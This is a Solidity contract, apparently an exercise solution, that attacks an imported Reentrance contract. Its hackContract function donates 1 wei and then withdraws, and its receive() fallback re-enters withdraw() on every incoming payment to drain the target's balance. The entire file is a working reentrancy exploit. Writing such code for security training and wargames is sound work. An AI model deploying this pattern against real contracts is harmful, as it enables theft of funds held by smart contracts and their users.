// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    receive() external payable {
        reentrance.withdraw();
    }

    function hackContract() external {
        // Code me!
        require(address(this).balance >= 1);
        reentrance.donate{value: 1}(address(payable(this)));
        reentrance.withdraw();
    }
}
